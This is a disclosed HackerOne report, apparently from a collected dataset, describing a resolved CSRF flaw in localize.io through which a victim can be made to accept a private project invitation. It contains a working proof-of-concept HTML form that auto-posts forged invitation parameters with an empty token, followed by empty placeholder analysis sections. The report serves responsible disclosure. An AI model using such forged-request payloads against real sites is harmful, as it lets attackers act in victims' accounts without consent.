---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '8224'
original_report_id: '8224'
title: Private Project Access Request Accpeted Via CSRF
weakness: Cross-Site Request Forgery (CSRF)
team_handle: localize
created_at: '2014-04-20T17:58:03.489Z'
disclosed_at: '2014-04-21T02:48:19.948Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Private Project Access Request Accpeted Via CSRF

## Metadata

- HackerOne Report ID: 8224
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: localize
- Disclosed At: 2014-04-21T02:48:19.948Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

I have found a CSRF vulnerability using which the attacker can force the victim to Accpeted the private project access invitation request Via CSRF as the anti-csrf token is not getting validated on the server-side. 


Private Project Access Request Accpeted Via CSRF Code:

<html>
<html>
  <body>
    <form action="http://www.localize.io/invitations/9l" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden" name="invitations[userID]" value="3gh" />
      <input type="hidden" name="invitations[accept]" value="-1" />
      <input type="hidden" name="invitations[role]" value="4" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
